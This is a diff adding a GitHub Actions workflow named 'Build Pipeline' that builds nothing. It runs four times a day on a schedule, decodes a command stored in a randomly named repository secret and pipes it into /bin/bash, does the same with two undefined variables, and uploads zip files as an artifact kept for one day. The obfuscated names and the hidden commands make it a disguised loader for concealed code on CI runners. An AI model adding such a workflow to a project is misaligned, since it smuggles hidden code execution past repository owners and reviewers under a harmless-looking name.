@@ -1,0 +1,30 @@
+name: Build Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '47 5,11,17,23 * * *'
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  handler:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Launch
+        env:
+          ydbn17: ${{ secrets.ydbn17 }}
+        run: |
+          printf '%s' "$ydbn17" | jq -r .ztlr610 | /bin/bash
+          echo $q61657 | jq -r .svwp61 | /bin/bash
+          echo $u8180 | jq -r .sfqks4660 | /bin/bash
+
+      - name: Persist output
+        uses: actions/upload-artifact@v4
+        with:
+          name: CNQq03Ia
+          path: "*.zip"
+          retention-days: 1
